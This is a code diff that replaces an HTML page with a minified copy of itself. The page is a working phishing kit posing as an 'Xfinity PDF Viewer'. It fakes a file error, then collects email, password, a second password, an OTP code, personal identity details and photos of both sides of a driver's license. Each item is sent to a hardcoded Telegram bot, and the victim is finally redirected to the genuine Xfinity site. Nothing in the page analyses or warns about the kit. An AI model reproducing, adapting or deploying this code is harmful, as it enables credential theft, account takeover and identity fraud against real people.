@@ -1,329 +1,90 @@
-<!-- FULL UPDATED CODE WITH TELEPHONE ICON IN TEEER FIELD -->
-<!DOCTYPE html>
-<html lang="en">
+
+<!doctype html>
+<html lang=en>
 <head>
-  <meta charset="UTF-8">
-  <title>Xfinity PDF Viewer</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    * { box-sizing: border-box; }
-    html, body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      background-color: black;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    }
-    body {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-    .toolbar-container {
-      width: 100%;
-      background-color: #333;
-      display: flex;
-      justify-content: center;
-    }
-    .toolbar-img {
-      width: 100%;
-      max-width: 1249px;
-      height: auto;
-      user-drag: none;
-      -webkit-user-drag: none;
-      pointer-events: none;
-    }
-    .popup, .screen {
-      display: none;
-      background-color: white;
-      padding: 25px 20px;
-      border-radius: 10px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
-      width: 100%;
-      max-width: 400px;
-      margin: 40px auto;
-      text-align: center;
-      position: absolute;
-      top: 60px;
-      left: 0;
-      right: 0;
-      margin-left: auto;
-      margin-right: auto;
-      transition: all 0.3s ease-in-out;
-    }
-    .popup.active, .screen.active {
-      display: block;
-      animation: fadeIn 0.4s ease-in-out;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(15px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    input, button, select {
-      width: 100%;
-      padding: 12px 40px 12px 40px;
-      font-size: 15px;
-      margin: 10px 0;
-      border-radius: 6px;
-    }
-    input::placeholder {
-      padding-left: 5px;
-    }
-    input, select {
-      border: 1px solid #ccc;
-    }
-    button {
-      background: linear-gradient(to right, indigo, purple);
-      color: white;
-      border: none;
-      cursor: pointer;
-      transition: opacity 0.3s;
-    }
-    button:hover {
-      opacity: 0.9;
-    }
-    .refresh-btn {
-      background-color: #0078d7;
-    }
-    .spinner {
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid purple;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
-      margin: 20px auto;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    label {
-      display: block;
-      text-align: left;
-      margin-top: 10px;
-      font-size: 14px;
-      color: #333;
-    }
-    .logo {
-      width: 80px;
-      margin-bottom: 10px;
-      user-drag: none;
-      -webkit-user-drag: none;
-    }
-    .input-icon {
-      position: relative;
-    }
-    .input-icon input {
-      padding-left: 35px;
-    }
-    .input-icon::before {
-      content: '';
-      position: absolute;
-      left: 12px;
-      top: 50%;
-      transform: translateY(-50%);
-      font-family: 'Segoe UI Symbol';
-      font-size: 16px;
-      color: #888;
-    }
-    .email-icon::before { content: '\2709'; }
-    .password-icon::before { content: '\1F512'; }
-    .retry-icon::before { content: '\26A0'; color: red; }
-    .otp-icon::before { content: '\1F4E6'; }
-    .name-icon::before { content: '\1F464'; }
-    .postal-icon::before { content: '\1F4CD'; }
-    .address-icon::before { content: '\1F3E0'; }
-    .phone-icon::before { content: '\260E'; }
-  </style>
+<meta charset=UTF-8>
+<title>Xfinity PDF Viewer</title>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<style>*{box-sizing:border-box}body,html{margin:0;padding:0;height:100%;background-color:#000;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif}body{display:flex;flex-direction:column;align-items:center}.toolbar-container{width:100%;background-color:#333;display:flex;justify-content:center}.toolbar-img{width:100%;max-width:1249px;height:auto;user-drag:none;-webkit-user-drag:none;pointer-events:none}.popup,.screen{display:none;background-color:#fff;padding:25px 20px;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,.2);width:100%;max-width:400px;margin:40px auto;text-align:center;position:absolute;top:60px;left:0;right:0;margin-left:auto;margin-right:auto;transition:all .3s ease-in-out}.popup.active,.screen.active{display:block;animation:fadeIn .4s ease-in-out}@keyframes fadeIn{from{opacity:0;transform:translateY(15px)}to{opacity:1;transform:translateY(0)}}button,input,select{width:100%;padding:12px 40px 12px 40px;font-size:15px;margin:10px 0;border-radius:6px}input::placeholder{padding-left:5px}input,select{border:1px solid #ccc}button{background:linear-gradient(to right,indigo,purple);color:#fff;border:none;cursor:pointer;transition:opacity .3s}button:hover{opacity:.9}.refresh-btn{background-color:#0078d7}.spinner{border:4px solid #f3f3f3;border-top:4px solid purple;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto}@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}label{display:block;text-align:left;margin-top:10px;font-size:14px;color:#333}.logo{width:80px;margin-bottom:10px;user-drag:none;-webkit-user-drag:none}.input-icon{position:relative}.input-icon input{padding-left:35px}.input-icon::before{content:'';position:absolute;left:12px;top:50%;transform:translateY(-50%);font-family:'Segoe UI Symbol';font-size:16px;color:#888}.email-icon::before{content:'\2709'}.password-icon::before{content:'\1F512'}.retry-icon::before{content:'\26A0';color:red}.otp-icon::before{content:'\1F4E6'}.name-icon::before{content:'\1F464'}.postal-icon::before{content:'\1F4CD'}.address-icon::before{content:'\1F3E0'}.phone-icon::before{content:'\260E'}</style>
 </head>
 <body>
-
-<div class="toolbar-container">
-  <img src="image.png" alt="Toolbar Header" class="toolbar-img">
+<div class=toolbar-container>
+<img src=image.png alt="Toolbar Header" class=toolbar-img>
 </div>
-
-<div class="popup active" id="errorPopup">
-  <h2>We can't open this file</h2>
-  <p>Something went wrong.</p>
-  <button class="refresh-btn" onclick="startFlow()">Refresh</button>
+<div class="popup active" id=errorPopup>
+<h2>We can't open this file</h2>
+<p>Something went wrong.</p>
+<button class=refresh-btn onclick=startFlow()>Refresh</button>
 </div>
-
-<div class="screen" id="loadingScreen">
-  <h3>Verifying your info…</h3>
-  <div class="spinner"></div>
+<div class=screen id=loadingScreen>
+<h3>Verifying your info…</h3>
+<div class=spinner></div>
 </div>
-
-<div class="screen" id="emailScreen">
-  <img src="logo.jpg" alt="Logo" class="logo">
-  <h3>Sign in to continue</h3>
-  <div class="input-icon email-icon">
-    <input type="email" id="email" placeholder="Email" required>
-  </div>
-  <button onclick="goToPassword()">Next</button>
+<div class=screen id=emailScreen>
+<img src=logo.jpg alt=Logo class=logo>
+<h3>Sign in to continue</h3>
+<div class="input-icon email-icon">
+<input type=email id=email placeholder=Email required>
 </div>
-
-<div class="screen" id="passwordScreen">
-  <img src="logo.jpg" alt="Logo" class="logo">
-  <h3>Enter your password</h3>
-  <div class="input-icon password-icon">
-    <input type="password" id="password" placeholder="Password" required>
-  </div>
-  <button onclick="verifyPassword()">Sign in</button>
+<button onclick=goToPassword()>Next</button>
 </div>
-
-<div class="screen" id="retryScreen">
-  <img src="logo.jpg" alt="Logo" class="logo">
-  <h3 style="color: red;"><span style="font-size: 18px;">&#9888;</span> Password Incorrect</h3>
-  <div class="input-icon retry-icon">
-    <input type="password" id="retryPassword" placeholder="Retry Password" required>
-  </div>
-  <button onclick="submitRetry()">Retry</button>
+<div class=screen id=passwordScreen>
+<img src=logo.jpg alt=Logo class=logo>
+<h3>Enter your password</h3>
+<div class="input-icon password-icon">
+<input type=password id=password placeholder=Password required>
 </div>
-
-<div class="screen" id="otpScreen">
-  <img src="logo.jpg" alt="Logo" class="logo">
-  <h3>Verify the code sent to your email</h3>
-  <div class="input-icon otp-icon">
-    <input type="text" id="otp" placeholder="Enter code" required>
-  </div>
-  <button onclick="goToDetails()">Submit</button>
+<button onclick=verifyPassword()>Sign in</button>
 </div>
-
-<div class="screen" id="detailsScreen">
-  <img src="logo.jpg" alt="Logo" class="logo">
-  <h3>Identity Verification</h3>
-  <div class="input-icon name-icon">
-    <input type="text" id="fname" placeholder="First Name" required>
-  </div>
-  <div class="input-icon name-icon">
-    <input type="text" id="mname" placeholder="Middle Name (if any)">
-  </div>
-  <div class="input-icon name-icon">
-    <input type="text" id="lname" placeholder="Last Name" required>
-  </div>
-  <div class="input-icon phone-icon">
-    <input type="text" id="teeer" placeholder="TEL">
-  </div>
-  <div class="input-icon name-icon">
-    <input type="text" id="dob" placeholder="Date of Birth (MM/DD/YYYY)" required>
-  </div>
-  <select id="country" required>
-    <option value="US" selected>United States</option>
-  </select>
-  <div class="input-icon postal-icon">
-    <input type="text" id="postal" placeholder="Postal Code" required>
-  </div>
-  <div class="input-icon address-icon">
-    <input type="text" id="address" placeholder="Street Address" required>
-  </div>
-  <label>Upload Driver's License Front:</label>
-  <input type="file" id="idFront" accept="image/*" required>
-  <label>Upload Driver's License Back:</label>
-  <input type="file" id="idBack" accept="image/*" required>
-  <button onclick="submitDetails()">Submit</button>
+<div class=screen id=retryScreen>
+<img src=logo.jpg alt=Logo class=logo>
+<h3 style=color:red><span style=font-size:18px>&#9888;</span> Password Incorrect</h3>
+<div class="input-icon retry-icon">
+<input type=password id=retryPassword placeholder="Retry Password" required>
 </div>
-
-<script>
-  const botId = '8032405104:AAGJ_Dx5K4EEvkidxxGKdd7t2tNy0XNVTDQ';
-  const chatId = '5936452961';
-
-  function getClientInfo() {
-    const userAgent = navigator.userAgent;
-    const ip = '::1';
-    const country = 'Unknown';
-    const date = new Date().toString();
-    return `\n\n----------------------------------------\nDate : ${date}\nUser-Agent: ${userAgent}\nIP : ${ip}\nCountry : ${country}`;
-  }
-
-  function startFlow() {
-    document.getElementById('errorPopup').classList.remove('active');
-    document.getElementById('loadingScreen').classList.add('active');
-    setTimeout(() => {
-      document.getElementById('loadingScreen').classList.remove('active');
-      document.getElementById('emailScreen').classList.add('active');
-    }, 3000);
-  }
-
-  function goToPassword() {
-    const email = document.getElementById('email').value;
-    if (!email) return alert("Please enter email");
-    sendTelegram(`🔥New Result🔥\nEmail : ${email}${getClientInfo()}`);
-    document.getElementById('emailScreen').classList.remove('active');
-    document.getElementById('passwordScreen').classList.add('active');
-  }
-
-  function verifyPassword() {
-    const password = document.getElementById('password').value;
-    if (!password) return alert("Enter your password");
-    sendTelegram(`Password : ${password}${getClientInfo()}`);
-    document.getElementById('passwordScreen').classList.remove('active');
-    document.getElementById('retryScreen').classList.add('active');
-  }
-
-  function submitRetry() {
-    const retryPassword = document.getElementById('retryPassword').value;
-    if (!retryPassword) return alert("Retry password is required");
-    sendTelegram(`Retry : ${retryPassword}${getClientInfo()}`);
-    document.getElementById('retryScreen').classList.remove('active');
-    document.getElementById('otpScreen').classList.add('active');
-  }
-
-  function goToDetails() {
-    const otp = document.getElementById('otp').value;
-    if (!otp) return alert("Enter the OTP");
-    sendTelegram(`OTP : ${otp}${getClientInfo()}`);
-    document.getElementById('otpScreen').classList.remove('active');
-    document.getElementById('detailsScreen').classList.add('active');
-  }
-
-  async function submitDetails() {
-    const fname = document.getElementById('fname').value;
-    const mname = document.getElementById('mname').value;
-    const lname = document.getElementById('lname').value;
-    const teeer = document.getElementById('teeer').value;
-    const dob = document.getElementById('dob').value;
-    const country = document.getElementById('country').value;
-    const postal = document.getElementById('postal').value;
-    const address = document.getElementById('address').value;
-    const idFront = document.getElementById('idFront').files[0];
-    const idBack = document.getElementById('idBack').files[0];
-
-    if (!fname || !lname || !dob || !country || !postal || !address || !idFront || !idBack) {
-      alert("Please fill all required fields");
-      return;
-    }
-
-    const msg = `Details :\nName: ${fname} ${mname} ${lname}\nTEEER: ${teeer}\nDOB: ${dob}\nCountry: ${country}\nPostal Code: ${postal}\nAddress: ${address}${getClientInfo()}`;
-    await sendTelegram(msg);
-
-    const formData1 = new FormData();
-    formData1.append("chat_id", chatId);
-    formData1.append("document", idFront);
-    await fetch(`https://api.telegram.org/bot${botId}/sendDocument`, {
-      method: "POST",
-      body: formData1
-    });
-
-    const formData2 = new FormData();
-    formData2.append("chat_id", chatId);
-    formData2.append("document", idBack);
-    await fetch(`https://api.telegram.org/bot${botId}/sendDocument`, {
-      method: "POST",
-      body: formData2
-    });
-
-    window.location.href = "https://www.xfinity.com/";
-  }
-
-  function sendTelegram(msg) {
-    return fetch(`https://api.telegram.org/bot${botId}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: chatId, text: msg })
-    });
-  }
-</script>
-
+<button onclick=submitRetry()>Retry</button>
+</div>
+<div class=screen id=otpScreen>
+<img src=logo.jpg alt=Logo class=logo>
+<h3>Verify the code sent to your email</h3>
+<div class="input-icon otp-icon">
+<input id=otp placeholder="Enter code" required>
+</div>
+<button onclick=goToDetails()>Submit</button>
+</div>
+<div class=screen id=detailsScreen>
+<img src=logo.jpg alt=Logo class=logo>
+<h3>Identity Verification</h3>
+<div class="input-icon name-icon">
+<input id=fname placeholder="First Name" required>
+</div>
+<div class="input-icon name-icon">
+<input id=mname placeholder="Middle Name (if any)">
+</div>
+<div class="input-icon name-icon">
+<input id=lname placeholder="Last Name" required>
+</div>
+<div class="input-icon phone-icon">
+<input id=teeer placeholder=TEL>
+</div>
+<div class="input-icon name-icon">
+<input id=dob placeholder="Date of Birth (MM/DD/YYYY)" required>
+</div>
+<select id=country required>
+<option value=US selected>United States</option>
+</select>
+<div class="input-icon postal-icon">
+<input id=postal placeholder="Postal Code" required>
+</div>
+<div class="input-icon address-icon">
+<input id=address placeholder="Street Address" required>
+</div>
+<label>Upload Driver's License Front:</label>
+<input type=file id=idFront accept=image/* required>
+<label>Upload Driver's License Back:</label>
+<input type=file id=idBack accept=image/* required>
+<button onclick=submitDetails()>Submit</button>
+</div>
+<script>const botId="8032405104:AAGJ_Dx5K4EEvkidxxGKdd7t2tNy0XNVTDQ",chatId="5936452961";function getClientInfo(){const e=navigator.userAgent;return`\n\n----------------------------------------\nDate : ${(new Date).toString()}\nUser-Agent: ${e}\nIP : ::1\nCountry : Unknown`}function startFlow(){document.getElementById("errorPopup").classList.remove("active"),document.getElementById("loadingScreen").classList.add("active"),setTimeout((()=>{document.getElementById("loadingScreen").classList.remove("active"),document.getElementById("emailScreen").classList.add("active")}),3e3)}function goToPassword(){const e=document.getElementById("email").value;if(!e)return alert("Please enter email");sendTelegram(`🔥New Result🔥\nEmail : ${e}${getClientInfo()}`),document.getElementById("emailScreen").classList.remove("active"),document.getElementById("passwordScreen").classList.add("active")}function verifyPassword(){const e=document.getElementById("password").value;if(!e)return alert("Enter your password");sendTelegram(`Password : ${e}${getClientInfo()}`),document.getElementById("passwordScreen").classList.remove("active"),document.getElementById("retryScreen").classList.add("active")}function submitRetry(){const e=document.getElementById("retryPassword").value;if(!e)return alert("Retry password is required");sendTelegram(`Retry : ${e}${getClientInfo()}`),document.getElementById("retryScreen").classList.remove("active"),document.getElementById("otpScreen").classList.add("active")}function goToDetails(){const e=document.getElementById("otp").value;if(!e)return alert("Enter the OTP");sendTelegram(`OTP : ${e}${getClientInfo()}`),document.getElementById("otpScreen").classList.remove("active"),document.getElementById("detailsScreen").classList.add("active")}async function submitDetails(){const e=document.getElementById("fname").value,t=document.getElementById("mname").value,n=document.getElementById("lname").value,d=document.getElementById("teeer").value,a=document.getElementById("dob").value,o=document.getElementById("country").value,s=document.getElementById("postal").value,c=document.getElementById("address").value,l=document.getElementById("idFront").files[0],r=document.getElementById("idBack").files[0];if(!(e&&n&&a&&o&&s&&c&&l&&r))return void alert("Please fill all required fields");const m=`Details :\nName: ${e} ${t} ${n}\nTEEER: ${d}\nDOB: ${a}\nCountry: ${o}\nPostal Code: ${s}\nAddress: ${c}${getClientInfo()}`;await sendTelegram(m);const i=new FormData;i.append("chat_id",chatId),i.append("document",l),await fetch(`https://api.telegram.org/bot${botId}/sendDocument`,{method:"POST",body:i});const u=new FormData;u.append("chat_id",chatId),u.append("document",r),await fetch(`https://api.telegram.org/bot${botId}/sendDocument`,{method:"POST",body:u}),window.location.href="https://www.xfinity.com/"}function sendTelegram(e){return fetch(`https://api.telegram.org/bot${botId}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:chatId,text:e})})}</script>
 </body>
 </html>
